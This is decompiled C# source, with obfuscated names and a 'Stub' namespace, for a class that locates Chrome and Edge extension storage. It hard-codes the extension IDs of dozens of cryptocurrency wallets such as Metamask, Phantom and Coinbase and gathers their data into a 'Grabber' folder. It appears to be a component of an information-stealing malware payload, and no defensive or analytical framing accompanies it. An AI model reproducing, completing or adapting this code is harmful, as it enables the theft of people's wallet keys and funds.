using System;
using System.Collections.Generic;
using System.IO;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000A2 RID: 162
	internal sealed class BrowserWallets
	{
		// Token: 0x06000240 RID: 576 RVA: 0x00016AE0 File Offset: 0x00014CE0
		public static void GetChromeWallets(string saveDirectory)
		{
			string text = Path.Combine(new string[]
			{
				Paths.localAppData,
				"Google",
				"Chrome",
				"User Data",
				"Default",
				"Local Extension Settings"
			});
			BrowserWalletExtensionsHelper.GetWallets(saveDirectory, BrowserWallets.ChromeWalletsDirectories, text, "Chrome");
		}

		// Token: 0x06000241 RID: 577 RVA: 0x00016B3C File Offset: 0x00014D3C
		public static void GetEdgeWallets(string saveDirectory)
		{
			string text = Path.Combine(new string[]
			{
				Paths.localAppData,
				"Microsoft",
				"Edge",
				"User Data",
				"Default",
				"Local Extension Settings"
			});
			BrowserWalletExtensionsHelper.GetWallets(saveDirectory, BrowserWallets.EdgeWalletsDirectories, text, "Edge");
		}

		// Token: 0x06000242 RID: 578 RVA: 0x00016B98 File Offset: 0x00014D98
		public static void RunAllWalletExtraction()
		{
			string text = Path.Combine(Paths.InitWorkDir(), "BrowserWallets", "Grabber");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			BrowserWallets.GetChromeWallets(text);
			BrowserWallets.GetEdgeWallets(text);
		}

		// Token: 0x06000243 RID: 579 RVA: 0x000038B4 File Offset: 0x00001AB4
		public BrowserWallets()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000244 RID: 580 RVA: 0x00016BD8 File Offset: 0x00014DD8
		static BrowserWallets()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			BrowserWallets.ChromeWalletsDirectories = new Dictionary<string, string>
			{
				{ "Chrome_Authenticator", "bhghoamapcdpbohphigoooaddinpkbai" },
				{ "Chrome_Binance", "fhbohimaelbohpjbbldcngcnapndodjp" },
				{ "Chrome_Bitapp", "fihkakfobkmkjojpchpfgcmhfjnmnfpi" },
				{ "Chrome_BoltX", "aodkkagnadcbobfpggfnjeongemjbjca" },
				{ "Chrome_Coin98", "aeachknmefphepccionboohckonoeemg" },
				{ "Chrome_Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad" },
				{ "Chrome_Core", "agoakfejjabomempkjlepdflaleeobhb" },
				{ "Chrome_Crocobit", "pnlfjmlcjdjgkddecgincndfgegkecke" },
				{ "Chrome_Equal", "blnieiiffboillknjnepogjhkgnoapac" },
				{ "Chrome_Ever", "cgeeodpfagjceefieflmdfphplkenlfk" },
				{ "Chrome_ExodusWeb3", "aholpfdialjgjfhomihkjbmgjidlcdno" },
				{ "Chrome_Fewcha", "ebfidpplhabeedpnhjnobghokpiioolj" },
				{ "Chrome_Finnie", "cjmkndjhnagcfbpiemnkdpomccnjblmj" },
				{ "Chrome_Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln" },
				{ "Chrome_Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj" },
				{ "Chrome_HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib" },
				{ "Chrome_Iconex", "flpiciilemghbmfalicajoolhkkenfel" },
				{ "Chrome_JaxxLiberty", "cjelfplplebdjjenllpjcblmjkfcffne" },
				{ "Chrome_Kaikas", "jblndlipeogpafnldhgmapagcccfchpi" },
				{ "Chrome_KardiaChain", "pdadjkfkgcafgbceimcpbkalnfnepbnk" },
				{ "Chrome_Keplr", "dmkamcknogkgcdfhhbddcghachkejeap" },
				{ "Chrome_Liquality", "kpfopkelmapcoipemfendmdcghnegimn" },
				{ "Chrome_MEWCX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm" },
				{ "Chrome_MaiarDEFI", "dngmlblcodfobpdpecaadgfbcggfjfnm" },
				{ "Chrome_Martian", "efbglgofoippbgcjepnhiblaibcnclgk" },
				{ "Chrome_Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc" },
				{ "Chrome_Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn" },
				{ "Chrome_Metamask2", "ejbalbakoplchlghecdalmeeeajnimhm" },
				{ "Chrome_Mobox", "fcckkdbjnoikooededlapcalpionmalo" },
				{ "Chrome_Nami", "lpfcbjknijpeeillifnkikgncikgfhdo" },
				{ "Chrome_Nifty", "jbdaocneiiinmjbjlgalhcelgbejmnid" },
				{ "Chrome_Oxygen", "fhilaheimglignddkjgofkcbgekhenbh" },
				{ "Chrome_PaliWallet", "mgffkfbidihjpoaomajlbgchddlicgpn" },
				{ "Chrome_Petra", "ejjladinnckdgjemekebdpeokbikhfci" },
				{ "Chrome_Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa" },
				{ "Chrome_Pontem", "phkbamefinggmakgklpkljjmgibohnba" },
				{ "Chrome_Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec" },
				{ "Chrome_Safepal", "lgmpcpglpngdoalbgeoldeajfclnhafa" },
				{ "Chrome_Saturn", "nkddgncdjgjfcddamfgcmfnlhccnimig" },
				{ "Chrome_Slope", "pocmplpaccanhmnllbbkpgfliimjljgo" },
				{ "Chrome_Solfare", "khacbfnclnjfjakompbldhceolaealdn" },
				{ "Chrome_Sollet", "fhmfendgdocmcbmfikdcogofphimnkno" },
				{ "Chrome_Starcoin", "mfhbebgoclkghebffdldpobeajmbecfk" },
				{ "Chrome_Swash", "cmndjbecilbocjfkibfbifhngkdmjgog" },
				{ "Chrome_TempleTezos", "ookjlbkiijinhpmnjffcofjonbfbgaoc" },
				{ "Chrome_TerraStation", "aiifbnbfobpmeekipheeijimdpnlpgpp" },
				{ "Chrome_Tokenpocket", "mfgccjchihfkkindfppnaooecgfneiii" },
				{ "Chrome_Ton", "nphplpgoakhhjchkkhmiggakijnkhfnd" },
				{ "Chrome_Tonkeeper", "ogaghekfbbibgpkeboogffmphcecpbga" },
				{ "Chrome_Tron", "ibnejdfjmmkpcnlpebklmnkoeoihofec" },
				{ "Chrome_TrustWallet", "egjidjbpglichdcondbcbdnbeeppgdph" },
				{ "Chrome_Wombat", "amkmjjmmflddogmhpjloimipbofnfjih" },
				{ "Chrome_XDEFI", "hmeobnfnfcmdkdcmlblgagmfpfboieaf" },
				{ "Chrome_XMR.PT", "eigblbgjknlfbajkfhopmcojidlgcehm" },
				{ "Chrome_XinPay", "bocpokimicclpaiekenaeelehdjllofo" },
				{ "Chrome_Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb" },
				{ "Chrome_iWallet", "kncchdigobghenbbaddojjnnaogfppfj" }
			};
			BrowserWallets.EdgeWalletsDirectories = new Dictionary<string, string>
			{
				{ "Edge_Auvitas", "klfhbdnlcfcaccoakhceodhldjojboga" },
				{ "Edge_Math", "dfeccadlilpndjjohbjdblepmjeahlmm" },
				{ "Edge_Metamask", "ejbalbakoplchlghecdalmeeeajnimhm" },
				{ "Edge_MTV", "oooiblbdpdlecigodndinbpfopomaegl" },
				{ "Edge_Rabet", "aanjhgiamnacdfnlfnmgehjikagdbafd" },
				{ "Edge_Ronin", "bblmcdckkhkhfhhpfcchlpalebmonecp" },
				{ "Edge_Yoroi", "akoiaibnepcedcplijmiamnaigbepmcb" },
				{ "Edge_Zilpay", "fbekallmnjoeggkefjkbebpineneilec" },
				{ "Edge_Terra_Station", "ajkhoeiiokighlmdnlakpjfoobnjinie" },
				{ "Edge_Jaxx", "dmdimapfghaakeibppbfeokhgoikeoci" }
			};
		}

		// Token: 0x04000505 RID: 1285
		private static readonly Dictionary<string, string> ChromeWalletsDirectories;

		// Token: 0x04000506 RID: 1286
		private static readonly Dictionary<string, string> EdgeWalletsDirectories;
	}
}
